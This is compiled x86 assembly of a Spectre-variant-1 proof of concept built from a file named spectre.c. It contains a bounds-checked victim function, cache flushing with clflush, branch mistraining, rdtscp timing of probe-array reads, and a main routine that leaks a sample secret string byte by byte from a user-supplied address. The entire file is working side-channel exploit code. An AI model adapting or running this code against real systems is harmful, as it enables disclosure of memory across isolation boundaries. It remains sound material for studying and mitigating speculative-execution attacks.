	.text
	.intel_syntax noprefix
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset ebp, -8
	mov	ebp, esp
	.cfi_def_cfa_register ebp
	push	eax
	call	.L0$pb
.L0$pb:
	pop	ecx
.Ltmp0:
	add	ecx, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp0-.L0$pb)
	mov	eax, dword ptr [ebp + 8]
	mov	eax, dword ptr [ebp + 8]
	mov	ecx, dword ptr [ecx + array1_size@GOTOFF]
	cmp	eax, ecx
	jae	.LBB0_2
# %bb.1:
	mov	dword ptr [ebp - 4], 1
	jmp	.LBB0_3
.LBB0_2:
	mov	dword ptr [ebp - 4], 0
.LBB0_3:
	mov	eax, dword ptr [ebp - 4]
	add	esp, 4
	pop	ebp
	.cfi_def_cfa esp, 4
	ret
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset ebp, -8
	mov	ebp, esp
	.cfi_def_cfa_register ebp
	sub	esp, 8
	call	.L1$pb
.L1$pb:
	pop	ecx
.Ltmp1:
	add	ecx, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp1-.L1$pb)
	mov	dword ptr [ebp - 8], ecx        # 4-byte Spill
	mov	eax, dword ptr [ebp + 8]
	mov	eax, dword ptr [ebp + 8]
	mov	ecx, dword ptr [ecx + array1_size@GOTOFF]
	cmp	eax, ecx
	jae	.LBB1_6
# %bb.1:
	mov	eax, dword ptr [ebp + 8]
	sub	eax, 1
	mov	dword ptr [ebp - 4], eax
.LBB1_2:                                # =>This Inner Loop Header: Depth=1
	cmp	dword ptr [ebp - 4], 0
	jl	.LBB1_5
# %bb.3:                                #   in Loop: Header=BB1_2 Depth=1
	mov	eax, dword ptr [ebp - 8]        # 4-byte Reload
	mov	ecx, dword ptr [ebp - 4]
	movzx	ecx, byte ptr [eax + ecx + array1@GOTOFF]
	shl	ecx, 9
	movzx	edx, byte ptr [eax + ecx + array2@GOTOFF]
	movzx	ecx, byte ptr [eax + temp@GOTOFF]
	and	ecx, edx
                                        # kill: def $cl killed $cl killed $ecx
	mov	byte ptr [eax + temp@GOTOFF], cl
# %bb.4:                                #   in Loop: Header=BB1_2 Depth=1
	mov	eax, dword ptr [ebp - 4]
	add	eax, -1
	mov	dword ptr [ebp - 4], eax
	jmp	.LBB1_2
.LBB1_5:
	jmp	.LBB1_6
.LBB1_6:
	add	esp, 8
	pop	ebp
	.cfi_def_cfa esp, 4
	ret
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset ebp, -8
	mov	ebp, esp
	.cfi_def_cfa_register ebp
	push	ebx
	push	edi
	push	esi
	sub	esp, 92
	.cfi_offset esi, -20
	.cfi_offset edi, -16
	.cfi_offset ebx, -12
	call	.L2$pb
.L2$pb:
	pop	eax
.Ltmp2:
	add	eax, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp2-.L2$pb)
	mov	dword ptr [ebp - 84], eax       # 4-byte Spill
	mov	eax, dword ptr [ebp + 16]
	mov	eax, dword ptr [ebp + 12]
	mov	eax, dword ptr [ebp + 8]
	mov	dword ptr [ebp - 44], 0
	mov	dword ptr [ebp - 28], 0
.LBB2_1:                                # =>This Inner Loop Header: Depth=1
	cmp	dword ptr [ebp - 28], 256
	jge	.LBB2_4
# %bb.2:                                #   in Loop: Header=BB2_1 Depth=1
	mov	eax, dword ptr [ebp - 84]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 28]
	mov	dword ptr [eax + 4*ecx + results@GOTOFF], 0
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	mov	eax, dword ptr [ebp - 28]
	add	eax, 1
	mov	dword ptr [ebp - 28], eax
	jmp	.LBB2_1
.LBB2_4:
	mov	dword ptr [ebp - 24], 999
.LBB2_5:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_7 Depth 2
                                        #     Child Loop BB2_11 Depth 2
                                        #       Child Loop BB2_13 Depth 3
                                        #     Child Loop BB2_19 Depth 2
	cmp	dword ptr [ebp - 24], 0
	jle	.LBB2_27
# %bb.6:                                #   in Loop: Header=BB2_5 Depth=1
	mov	dword ptr [ebp - 28], 0
.LBB2_7:                                #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	dword ptr [ebp - 28], 256
	jge	.LBB2_10
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	mov	eax, dword ptr [ebp - 84]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 28]
	shl	ecx, 9
	lea	eax, [eax + array2@GOTOFF]
	add	eax, ecx
	clflush	byte ptr [eax]
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	mov	eax, dword ptr [ebp - 28]
	add	eax, 1
	mov	dword ptr [ebp - 28], eax
	jmp	.LBB2_7
.LBB2_10:                               #   in Loop: Header=BB2_5 Depth=1
	mov	ecx, dword ptr [ebp - 84]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 24]
	mov	ecx, dword ptr [ecx + array1_size@GOTOFF]
	cdq
	idiv	ecx
	mov	dword ptr [ebp - 48], edx
	mov	dword ptr [ebp - 32], 29
.LBB2_11:                               #   Parent Loop BB2_5 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_13 Depth 3
	cmp	dword ptr [ebp - 32], 0
	jl	.LBB2_18
# %bb.12:                               #   in Loop: Header=BB2_11 Depth=2
	mov	eax, dword ptr [ebp - 84]       # 4-byte Reload
	clflush	byte ptr [eax + array1_size@GOTOFF]
	mov	dword ptr [ebp - 80], 0
.LBB2_13:                               #   Parent Loop BB2_5 Depth=1
                                        #     Parent Loop BB2_11 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	mov	eax, dword ptr [ebp - 80]
	cmp	eax, 100
	jge	.LBB2_16
# %bb.14:                               #   in Loop: Header=BB2_13 Depth=3
	jmp	.LBB2_15
.LBB2_15:                               #   in Loop: Header=BB2_13 Depth=3
	mov	eax, dword ptr [ebp - 80]
	add	eax, 1
	mov	dword ptr [ebp - 80], eax
	jmp	.LBB2_13
.LBB2_16:                               #   in Loop: Header=BB2_11 Depth=2
	mov	ebx, dword ptr [ebp - 84]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 32]
	mov	ecx, 6
	cdq
	idiv	ecx
	mov	eax, edx
	sub	eax, 1
	and	eax, -65536
	mov	dword ptr [ebp - 52], eax
	mov	eax, dword ptr [ebp - 52]
	mov	ecx, dword ptr [ebp - 52]
	shr	ecx, 16
	or	eax, ecx
	mov	dword ptr [ebp - 52], eax
	mov	eax, dword ptr [ebp - 48]
	mov	ecx, dword ptr [ebp - 52]
	mov	edx, dword ptr [ebp + 8]
	xor	edx, dword ptr [ebp - 48]
	and	ecx, edx
	xor	eax, ecx
	mov	dword ptr [ebp - 52], eax
	mov	eax, dword ptr [ebp - 52]
	mov	dword ptr [esp], eax
	call	victim_function
# %bb.17:                               #   in Loop: Header=BB2_11 Depth=2
	mov	eax, dword ptr [ebp - 32]
	add	eax, -1
	mov	dword ptr [ebp - 32], eax
	jmp	.LBB2_11
.LBB2_18:                               #   in Loop: Header=BB2_5 Depth=1
	mov	dword ptr [ebp - 28], 0
.LBB2_19:                               #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	dword ptr [ebp - 28], 256
	jge	.LBB2_25
# %bb.20:                               #   in Loop: Header=BB2_19 Depth=2
	mov	eax, dword ptr [ebp - 84]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 28]
	imul	ecx, ecx, 167
	add	ecx, 13
                                        # kill: def $cl killed $cl killed $ecx
	movzx	ecx, cl
	mov	dword ptr [ebp - 40], ecx
	mov	ecx, dword ptr [ebp - 40]
	shl	ecx, 9
	lea	eax, [eax + ecx + array2@GOTOFF]
	mov	dword ptr [ebp - 76], eax
	lea	eax, [ebp - 44]
	mov	dword ptr [ebp - 96], eax       # 4-byte Spill
	mov	dword ptr [ebp - 16], eax
	mov	esi, dword ptr [ebp - 16]
	rdtscp
	mov	edi, eax
	mov	eax, dword ptr [ebp - 96]       # 4-byte Reload
	mov	dword ptr [ebp - 92], edi       # 4-byte Spill
	mov	edi, ecx
	mov	ecx, dword ptr [ebp - 92]       # 4-byte Reload
	mov	dword ptr [esi], edi
	mov	dword ptr [ebp - 60], edx
	mov	dword ptr [ebp - 64], ecx
	mov	ecx, dword ptr [ebp - 76]
	movzx	ecx, byte ptr [ecx]
	mov	dword ptr [ebp - 44], ecx
	mov	dword ptr [ebp - 20], eax
	mov	eax, dword ptr [ebp - 20]
	mov	dword ptr [ebp - 88], eax       # 4-byte Spill
	rdtscp
	mov	esi, ecx
	mov	ecx, dword ptr [ebp - 88]       # 4-byte Reload
	mov	dword ptr [ecx], esi
	mov	esi, dword ptr [ebp - 64]
	mov	ecx, dword ptr [ebp - 60]
	sub	eax, esi
	sbb	edx, ecx
	mov	dword ptr [ebp - 72], eax
	mov	dword ptr [ebp - 68], edx
	mov	esi, dword ptr [ebp - 72]
	mov	ecx, dword ptr [ebp - 68]
	xor	eax, eax
	mov	edx, 50
	sub	edx, esi
	sbb	eax, ecx
	jb	.LBB2_23
	jmp	.LBB2_21
.LBB2_21:                               #   in Loop: Header=BB2_19 Depth=2
	mov	ecx, dword ptr [ebp - 84]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 40]
	mov	dword ptr [ebp - 100], eax      # 4-byte Spill
	mov	eax, dword ptr [ebp - 24]
	mov	esi, dword ptr [ecx + array1_size@GOTOFF]
	cdq
	idiv	esi
	mov	eax, dword ptr [ebp - 100]      # 4-byte Reload
	movzx	ecx, byte ptr [ecx + edx + array1@GOTOFF]
	cmp	eax, ecx
	je	.LBB2_23
# %bb.22:                               #   in Loop: Header=BB2_19 Depth=2
	mov	eax, dword ptr [ebp - 84]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 40]
	mov	edx, dword ptr [eax + 4*ecx + results@GOTOFF]
	add	edx, 1
	mov	dword ptr [eax + 4*ecx + results@GOTOFF], edx
.LBB2_23:                               #   in Loop: Header=BB2_19 Depth=2
	jmp	.LBB2_24
.LBB2_24:                               #   in Loop: Header=BB2_19 Depth=2
	mov	eax, dword ptr [ebp - 28]
	add	eax, 1
	mov	dword ptr [ebp - 28], eax
	jmp	.LBB2_19
.LBB2_25:                               #   in Loop: Header=BB2_5 Depth=1
	jmp	.LBB2_26
.LBB2_26:                               #   in Loop: Header=BB2_5 Depth=1
	mov	eax, dword ptr [ebp - 24]
	add	eax, -1
	mov	dword ptr [ebp - 24], eax
	jmp	.LBB2_5
.LBB2_27:
	mov	eax, dword ptr [ebp - 84]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 44]
	xor	ecx, dword ptr [eax + results@GOTOFF]
	mov	dword ptr [eax + results@GOTOFF], ecx
	add	esp, 92
	pop	esi
	pop	edi
	pop	ebx
	pop	ebp
	.cfi_def_cfa esp, 4
	ret
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset ebp, -8
	mov	ebp, esp
	.cfi_def_cfa_register ebp
	push	ebx
	push	esi
	sub	esp, 80
	.cfi_offset esi, -16
	.cfi_offset ebx, -12
	call	.L3$pb
.L3$pb:
	pop	eax
.Ltmp3:
	add	eax, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp3-.L3$pb)
	mov	dword ptr [ebp - 64], eax       # 4-byte Spill
	mov	eax, dword ptr [ebp + 12]
	mov	eax, dword ptr [ebp + 8]
	mov	dword ptr [ebp - 12], 0
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_3 Depth 2
                                        #     Child Loop BB3_9 Depth 2
                                        #       Child Loop BB3_11 Depth 3
	mov	ebx, dword ptr [ebp - 64]       # 4-byte Reload
	call	getchar@PLT
                                        # kill: def $al killed $al killed $eax
	mov	byte ptr [ebp - 13], al
	movsx	eax, byte ptr [ebp - 13]
	cmp	eax, 114
	jne	.LBB3_19
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	mov	ebx, dword ptr [ebp - 64]       # 4-byte Reload
	mov	ecx, dword ptr [ebx + secret@GOTOFF]
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	lea	edx, [ebx + .L.str.1@GOTOFF]
	mov	dword ptr [esp], edx
	mov	dword ptr [esp + 4], ecx
	mov	dword ptr [esp + 8], eax
	call	printf@PLT
	mov	ebx, dword ptr [ebp - 64]       # 4-byte Reload
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	lea	ecx, [ebx + array1@GOTOFF]
	sub	eax, ecx
	mov	dword ptr [ebp - 20], eax
	mov	ecx, dword ptr [ebx + secret@GOTOFF]
	mov	eax, esp
	mov	dword ptr [eax], ecx
	call	strlen@PLT
	mov	dword ptr [ebp - 32], eax
	mov	dword ptr [ebp - 40], 0
.LBB3_3:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	dword ptr [ebp - 40], 131072
	jae	.LBB3_6
# %bb.4:                                #   in Loop: Header=BB3_3 Depth=2
	mov	eax, dword ptr [ebp - 64]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 40]
	mov	byte ptr [eax + ecx + array2@GOTOFF], 1
# %bb.5:                                #   in Loop: Header=BB3_3 Depth=2
	mov	eax, dword ptr [ebp - 40]
	add	eax, 1
	mov	dword ptr [ebp - 40], eax
	jmp	.LBB3_3
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	cmp	dword ptr [ebp + 8], 3
	jne	.LBB3_8
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	mov	ebx, dword ptr [ebp - 64]       # 4-byte Reload
	mov	eax, dword ptr [ebp + 12]
	mov	edx, dword ptr [eax + 4]
	lea	eax, [ebp - 20]
	lea	ecx, [ebx + .L.str.2@GOTOFF]
	mov	dword ptr [esp], edx
	mov	dword ptr [esp + 4], ecx
	mov	dword ptr [esp + 8], eax
	call	__isoc99_sscanf@PLT
	mov	ebx, dword ptr [ebp - 64]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 20]
	lea	ecx, [ebx + array1@GOTOFF]
	sub	eax, ecx
	mov	dword ptr [ebp - 20], eax
	mov	eax, dword ptr [ebp + 12]
	mov	edx, dword ptr [eax + 8]
	lea	ecx, [ebx + .L.str.3@GOTOFF]
	lea	eax, [ebp - 32]
	mov	dword ptr [esp], edx
	mov	dword ptr [esp + 4], ecx
	mov	dword ptr [esp + 8], eax
	call	__isoc99_sscanf@PLT
	mov	ebx, dword ptr [ebp - 64]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 20]
	mov	eax, dword ptr [ebp - 32]
	lea	edx, [ebx + .L.str.4@GOTOFF]
	mov	dword ptr [esp], edx
	mov	dword ptr [esp + 4], ecx
	mov	dword ptr [esp + 8], eax
	call	printf@PLT
.LBB3_8:                                #   in Loop: Header=BB3_1 Depth=1
	mov	ebx, dword ptr [ebp - 64]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 32]
	lea	ecx, [ebx + .L.str.5@GOTOFF]
	mov	dword ptr [esp], ecx
	mov	dword ptr [esp + 4], eax
	call	printf@PLT
	mov	dword ptr [ebp - 44], 0
.LBB3_9:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_11 Depth 3
	mov	eax, dword ptr [ebp - 32]
	add	eax, -1
	mov	dword ptr [ebp - 32], eax
	cmp	eax, 0
	jl	.LBB3_18
# %bb.10:                               #   in Loop: Header=BB3_9 Depth=2
	mov	ebx, dword ptr [ebp - 64]       # 4-byte Reload
	mov	edx, dword ptr [ebp - 20]
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	mov	ecx, dword ptr [ebp - 44]
	movsx	ecx, byte ptr [eax + ecx]
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	mov	esi, dword ptr [ebp - 44]
	movsx	eax, byte ptr [eax + esi]
	lea	esi, [ebx + .L.str.6@GOTOFF]
	mov	dword ptr [esp], esi
	mov	dword ptr [esp + 4], edx
	mov	dword ptr [esp + 8], ecx
	mov	dword ptr [esp + 12], eax
	call	printf@PLT
	mov	ebx, dword ptr [ebp - 64]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 44]
	add	eax, 1
	mov	dword ptr [ebp - 44], eax
	mov	edx, dword ptr [ebp - 20]
	mov	eax, edx
	add	eax, 1
	mov	dword ptr [ebp - 20], eax
	lea	ecx, [ebp - 34]
	lea	eax, [ebp - 28]
	mov	dword ptr [esp], edx
	mov	dword ptr [esp + 4], ecx
	mov	dword ptr [esp + 8], eax
	call	readMemoryByte
	mov	eax, dword ptr [ebp - 64]       # 4-byte Reload
	mov	eax, dword ptr [eax + results@GOTOFF]
	mov	dword ptr [ebp - 48], eax
	mov	dword ptr [ebp - 52], 1
.LBB3_11:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_9 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	cmp	dword ptr [ebp - 52], 256
	jge	.LBB3_17
# %bb.12:                               #   in Loop: Header=BB3_11 Depth=3
	mov	eax, dword ptr [ebp - 64]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 52]
	sub	ecx, 1
	mov	ecx, dword ptr [eax + 4*ecx + results@GOTOFF]
	mov	dword ptr [ebp - 56], ecx
	mov	ecx, dword ptr [ebp - 52]
	mov	eax, dword ptr [eax + 4*ecx + results@GOTOFF]
	mov	dword ptr [ebp - 60], eax
	mov	eax, dword ptr [ebp - 56]
	cmp	eax, dword ptr [ebp - 60]
	jle	.LBB3_15
# %bb.13:                               #   in Loop: Header=BB3_11 Depth=3
	mov	eax, dword ptr [ebp - 56]
	sub	eax, dword ptr [ebp - 60]
	cmp	eax, 100
	jle	.LBB3_15
# %bb.14:                               #   in Loop: Header=BB3_11 Depth=3
	mov	ebx, dword ptr [ebp - 64]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 52]
	sub	ecx, 1
	mov	eax, dword ptr [ebp - 52]
	sub	eax, 1
	mov	eax, dword ptr [ebx + 4*eax + results@GOTOFF]
	lea	edx, [ebx + .L.str.7@GOTOFF]
	mov	dword ptr [esp], edx
	mov	dword ptr [esp + 4], ecx
	mov	dword ptr [esp + 8], eax
	call	printf@PLT
	mov	ebx, dword ptr [ebp - 64]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 52]
	mov	eax, dword ptr [ebp - 52]
	mov	eax, dword ptr [ebx + 4*eax + results@GOTOFF]
	lea	edx, [ebx + .L.str.7@GOTOFF]
	mov	dword ptr [esp], edx
	mov	dword ptr [esp + 4], ecx
	mov	dword ptr [esp + 8], eax
	call	printf@PLT
.LBB3_15:                               #   in Loop: Header=BB3_11 Depth=3
	jmp	.LBB3_16
.LBB3_16:                               #   in Loop: Header=BB3_11 Depth=3
	mov	eax, dword ptr [ebp - 52]
	add	eax, 1
	mov	dword ptr [ebp - 52], eax
	jmp	.LBB3_11
.LBB3_17:                               #   in Loop: Header=BB3_9 Depth=2
	mov	ebx, dword ptr [ebp - 64]       # 4-byte Reload
	lea	eax, [ebx + .L.str.8@GOTOFF]
	mov	dword ptr [esp], eax
	call	printf@PLT
	jmp	.LBB3_9
.LBB3_18:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_26
.LBB3_19:                               #   in Loop: Header=BB3_1 Depth=1
	movsx	eax, byte ptr [ebp - 13]
	cmp	eax, 10
	jne	.LBB3_21
# %bb.20:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_1
.LBB3_21:                               #   in Loop: Header=BB3_1 Depth=1
	movsx	eax, byte ptr [ebp - 13]
	cmp	eax, 105
	jne	.LBB3_23
# %bb.22:                               #   in Loop: Header=BB3_1 Depth=1
	mov	ebx, dword ptr [ebp - 64]       # 4-byte Reload
	call	getpid@PLT
	mov	ebx, dword ptr [ebp - 64]       # 4-byte Reload
	mov	ecx, eax
	lea	eax, [ebx + .L.str.9@GOTOFF]
	mov	eax, esp
	mov	dword ptr [eax + 12], ecx
	lea	ecx, [ebx + check@GOTOFF]
	add	ecx, 33
	mov	dword ptr [eax + 4], ecx
	lea	ecx, [ebx + .L.str.9@GOTOFF]
	mov	dword ptr [eax], ecx
	setb	cl
	movzx	ecx, cl
	mov	dword ptr [eax + 8], ecx
	call	printf@PLT
	jmp	.LBB3_24
.LBB3_23:
	jmp	.LBB3_27
.LBB3_24:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_25
.LBB3_25:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_26
.LBB3_26:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_1
.LBB3_27:
	xor	eax, eax
	add	esp, 80
	pop	esi
	pop	ebx
	pop	ebp
	.cfi_def_cfa esp, 4
	ret
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	2
secret:
	.long	.L.str
	.size	secret, 4

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	array2,@object                  # @array2
	.globl	array2
array2:
	.zero	131072
	.size	array2, 131072

	.type	results,@object                 # @results
	.local	results
	.comm	results,1024,4
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
	.size	.L.str.6, 55

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"result[%d]=%d "
	.size	.L.str.7, 15

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"\n"
	.size	.L.str.8, 2

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.9, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym victim_function
	.addrsig_sym readMemoryByte
	.addrsig_sym getchar
	.addrsig_sym printf
	.addrsig_sym strlen
	.addrsig_sym __isoc99_sscanf
	.addrsig_sym getpid
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym secret
	.addrsig_sym temp
	.addrsig_sym array2
	.addrsig_sym results
